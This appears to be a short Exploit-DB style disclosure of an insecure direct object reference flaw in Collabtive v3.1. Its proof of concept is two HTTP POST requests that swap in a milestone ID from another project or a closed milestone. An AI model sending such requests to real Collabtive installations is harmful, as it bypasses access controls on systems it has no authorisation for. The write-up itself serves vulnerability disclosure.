# Exploit Title: Collabtive v3.1 - Insecure Direct Object Reference(IDOR)
## Date: 1/4/2024
## Vendor Homepage: https://github.com/philippK-de/Collabtive
## Tested on: Debian Linux, Apache, Mysql
## Vendor: philippK-de
## Version: v3.1
## Exploit Description:
## Collabtive v3.1 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to cite the milestone that is closed or belongs to other project(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
POST /managemessage.php?action=add&id=1 HTTP/1.1
...

&privateRecipient=0&title=aaaaa&=&=&=&=&=&=&=&=&=&=&=&=&text=aaa&milestone=4(CHANGE HERE)&sendto[]=all&=&=
```

```
POST /managetasklist.php?action=add&id=1 HTTP/1.1
...

name=tt&desc=aaaa&milestone=3(CHANGE HERE)
```